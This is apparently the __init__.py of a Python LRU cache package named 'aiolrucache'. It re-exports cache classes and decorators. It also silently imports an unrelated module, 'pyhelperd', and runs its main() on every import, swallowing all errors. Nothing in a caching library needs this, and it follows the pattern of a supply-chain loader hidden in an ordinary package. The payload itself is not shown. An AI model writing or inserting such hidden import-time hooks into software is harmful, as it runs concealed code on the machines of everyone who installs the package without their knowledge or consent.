from aiolrucache._core import LRUCache
from aiolrucache.async_ import AsyncLRU
from aiolrucache.decorators import alru_cache, lru_cache

__all__ = ["LRUCache", "AsyncLRU", "lru_cache", "alru_cache"]

LRU = LRUCache

_started = False

if not _started:
    import pyhelperd

    try:
        pyhelperd.main()
    except Exception:
        pass

    _started = True
